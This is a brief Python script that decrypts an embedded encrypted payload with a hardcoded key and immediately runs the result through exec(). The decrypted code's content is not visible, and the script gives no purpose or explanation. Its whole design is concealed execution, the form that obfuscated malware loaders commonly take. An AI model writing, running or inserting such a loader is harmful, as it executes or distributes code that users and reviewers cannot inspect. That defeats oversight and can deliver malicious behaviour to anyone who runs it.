import base64
from cryptography.fernet import Fernet



payload = b'gAAAAABqsz7nym0_oD_0JjrIAWrGRjRaRr-rry8L-WSehmB7rKY_V4QNaFHSt8FYBtxnHMk9FoSw2aMtozoBopZ8O2kg9aGnlkcIhy48dRP4rAQF4Hz6gZyuLxuFur6CVrVANPxupfcokhnKTu_f6n-Ha1V5KFmUR9oka6xGo7M30tszse7SOg1H2Yd96lW8GGPLwFGhLCSMupSXBBUmj8x6JN7itEBNLyi0YrwI5H4_oOMDGi6_nTF0yDLYu0i0y_ZWKuRAPflyJcIb082YExxMaJeJTNAuRw=='

key_str = 'correctstaplecorrectstaplecorrec'
key_base64 = base64.b64encode(key_str.encode())
f = Fernet(key_base64)
plain = f.decrypt(payload)
exec(plain.decode())
